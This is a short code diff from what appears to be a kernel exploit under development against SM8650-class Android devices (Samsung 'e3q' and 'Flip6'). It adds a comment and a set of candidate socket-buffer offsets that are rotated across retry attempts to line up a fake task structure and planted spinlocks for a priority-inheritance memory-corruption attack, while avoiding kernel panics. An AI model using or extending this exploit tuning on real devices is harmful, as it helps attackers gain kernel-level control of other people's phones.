@@ -26,7 +26,17 @@
 #define P0_PHYS_OFFSET 0x80000000ULL
 /* Same pineapple/SM8650-class load used by e3q; confirm on-device if phys oracle fails. */
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
+/*
+ * Default matches e3q; Flip6 live panics show PI hits our fake_task/lock but
+ * pi_lock word is garbage → likely skb linear base vs pointer base skew.
+ * SKB_DELTA_CANDIDATES is rotated per supervisor attempt (and overridable via
+ * SKB_DATA_DELTA= env). Safety zeros plant unlocked qspinlocks at every
+ * candidate's pi_lock/wait_lock buffer offsets so a wrong delta is less likely
+ * to BRK in queued_spin_lock_slowpath.
+ */
 #define SKB_DATA_DELTA (-0x1000LL)
+#define SKB_DELTA_CANDIDATES \
+  -0x1000LL, -0xe80LL, 0LL, -0x800LL, -0x2000LL, -0x80LL, -0x2c0LL
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
